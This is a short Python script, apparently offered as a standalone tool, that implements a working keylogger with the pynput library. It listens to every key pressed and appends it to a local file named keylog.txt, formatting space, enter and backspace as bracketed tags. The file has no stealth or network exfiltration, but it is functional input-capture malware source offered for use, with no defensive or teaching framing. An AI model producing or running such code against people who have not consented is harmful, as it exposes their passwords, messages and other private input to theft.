from pynput import keyboard

# File to store the logged keystrokes
log_file = "keylog.txt"

def write_to_file(key):
    """
    Writes the pressed key to the log file.
    """
    with open(log_file, "a") as file:
        try:
            # Handle special keys and format
            if key == keyboard.Key.space:
                file.write(" [SPACE] ")
            elif key == keyboard.Key.enter:
                file.write(" [ENTER]\n")
            elif key == keyboard.Key.backspace:
                file.write(" [BACKSPACE] ")
            elif hasattr(key, 'char'):  # For alphanumeric keys
                file.write(key.char)
            else:
                file.write(f" [{key}] ")
        except Exception as e:
            print(f"Error writing key: {e}")

def on_press(key):
    """
    Callback function triggered when a key is pressed.
    """
    write_to_file(key)

def main():
    """
    Main function to start the keylogger.
    """
    print("Keylogger started. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Keylogger stopped.")

if __name__ == "__main__":
    main()
